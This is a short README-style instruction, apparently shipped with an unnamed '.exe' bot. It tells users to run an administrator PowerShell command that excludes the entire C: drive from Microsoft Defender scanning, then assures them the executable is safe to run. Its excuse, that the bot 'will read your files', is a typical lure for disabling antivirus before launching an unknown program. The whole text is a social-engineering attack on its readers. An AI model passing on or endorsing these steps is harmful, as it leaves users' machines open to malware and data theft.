IMPORTANT NEEEDED .EXE FILE WONT WORK WITHOUT

Go Into Powershell run powershell as admin run the command (Add-MpPreference -ExclusionPath "C:\") (dont invlude the parenthesis) 

this command makes the file excluded from looking at your files since it will read your files and reading your files will break the bot
if you get a error you didnt run powershell as admin so run it as adminastrator if nothing happens when you run the command it worked 
you can safely run the exe file
